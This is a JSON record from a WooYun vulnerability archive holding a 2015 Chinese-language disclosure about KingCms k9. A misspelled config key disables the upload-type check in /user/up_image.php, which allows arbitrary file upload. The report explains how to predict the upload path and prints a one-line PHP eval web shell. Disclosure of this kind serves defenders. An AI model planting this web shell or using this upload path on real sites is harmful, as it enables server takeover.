{"id": 36372, "wybug_id": "wooyun-2015-0102022", "wybug_title": "KingCms最新版（k9）GetShell", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-18 15:11", "wybug_open_date": "2015-05-02 15:12", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）GetShell 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9，官网下下来学习一下。在平台看到了几个漏洞，如：来看看这次shell是如何发生的吧问题文件在/user/up_image.php先来看看图片上传的整个过程/user/up_image.php（下面代码中关键步骤我都加了注释）\n$upext=kc_config('up.imageype');//注释1：获取允许上传的图片类型@ini_set('upload_tmp_dir',ROOT.PATH_UP.'/temp/'); 无关代码$err = \"\";$msg = \"''\";$u=new user;$userid=$u->info['userid'];if($u->auth_group('user_upimage',true)==false) $err='您所在会员组会员无权上传图片';$upfile=@$_FILES[$inputname];if(!isset($upfile))$err='文件域的name错误';elseif(!empty($upfile['error'])){\t无关代码}elseif(empty($upfile['tmp_name']) || $upfile['tmp_name'] == 'none')$err = '无文件上传';else{\t$temppath=$upfile['tmp_name'];\t$extension=strtolower(substr($upfile['name'],strrpos($upfile['name'],'.')+1));//注释2：获取上传文件的类型\tif(preg_match('/'.str_replace(',','|',$upext).'/i',$extension))//注释3：判断文件是否允许上传\t{\t\t\t\t$bytes=$upfile['size'];//filesize($temppath);\t\tif($bytes > $maxattachsize)$err='请不要上传大小超过'.formatBytes($maxattachsize).'的文件';\t\telse\t\t{\t\t\t//创建目录\t\t\t$attach_subdir =date('y/m/d');\t\t\t$attach_dir = PATH_UP.'/'.$attach_subdir;\t\t\t$attach_subdirs=explode('/',$attach_subdir);\t\t\t$attach_temp=ROOT.PATH_UP;\t\t\tforeach($attach_subdirs as $r){//注释4：上传后文件的路径\t\t\t\t$attach_temp.='/'.$r;\t\t\t\tif(!is_dir($attach_temp)){\t\t\t\t\t@mkdir($attach_temp, 0755); \t\t\t\t\t@fclose(fopen($attach_temp.'/index.html', 'w'));\t\t\t\t}\t\t\t}\t\t\t$filename=date(\"His\").mt_rand(1000,9999).'.'.$extension;//注释5：上传后文件的名字\t\t\t$target = $attach_dir.'/'.$filename;\t\t\trename($temppath,ROOT.$target);\t\t\t$arr=getimagesize(ROOT.$target);\t\t\tlist($width,$height)=$arr;\t\t\t$extension=strtolower(substr(strrchr($arr['mime'], '/'), 1));\t\t\t$fext=$extension=='jpg' ? 'jpeg' : strtolower($extension);\t\t\t$func='imagecreatefrom'.$fext;//加载图像函数\t\t\t$source=$func(ROOT.$target);\t\t\t$max_width=kc_config('system.image_width');\t\t\t$max_height=kc_config('system.image_height');\t\t\tif ($width>$max_width || $height>$max_height) {\t\t\t\tif($width>=$height*$max_width/$max_height){\t\t\t\t\t$newW=$max_width;\t\t\t\t\t$newH=($max_width/$width)*$height;\t\t\t\t}else{\t\t\t\t\t$newW=($max_height/$height)*$width;\t\t\t\t\t$newH=$max_height;\t\t\t\t}\t\t\t\t$thumb=imagecreatetruecolor($newW, $newH);\t\t\t\t// Resize\t\t\t\timagecopyresampled($thumb, $source, 0, 0, 0, 0, $newW, $newH, $width, $height);\t\t\t\t$func='image'.$fext;\t\t\t\timageantialias($thumb,True);\t\t\t\t$func($thumb,ROOT.$target);\t\t\t\t@chmod(ROOT.$target,0755);\t\t\t}无关代码\n整个上传的过程简单来说是这样实现的：1：获取允许上传的图片类型（见上面代码中注释1）2：获取上传文件的类型（见上面代码中注释2）3：判断文件是否允许上传（见上面代码中注释3）4：上传后文件的路径（见上面代码中注释4）5：上传后文件的名字（见上面代码中注释5）问题就出在第1步，$upext=kc_config('up.imageype');在获取允许上传的文件类型时，正确的写法应该是$upext=kc_config('up.imagetype');（请看官仔细对比这两句代码的不同之处，反正我当时测试的时候看了半天，哈哈）。由于这个错误，导致$upext是空，也就使的（第3步）：preg_match('/'.str_replace(',','|',$upext).'/i',$extension)总是返回1，也就是说任何后缀的文件都可以上传了！程序员该打PP~然后分析第4、5步，可以得到文件上传的路径是以当前时间定义的，比如今天是2015-03-16，上传后文件的路径是/upfiles/15/03/16,文件是名字也是根据当前时间定义的，时分秒.xxxx.后缀（xxxx四位随机数），当然文件上传后可以通过图片属性获得其路径，也可以遍历这4个随机数（毕竟样本太少了，秒遍历啊）。上传个php文件看看，内容为\n<?php eval($_POST[\"p\"]);?>\n\n\n上传成功后就可以为所欲为了，大马、菜刀…，这里测试一下吧\n\n   漏洞证明：  见 详细说明   修复方案：  修改写错的拼写啊   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}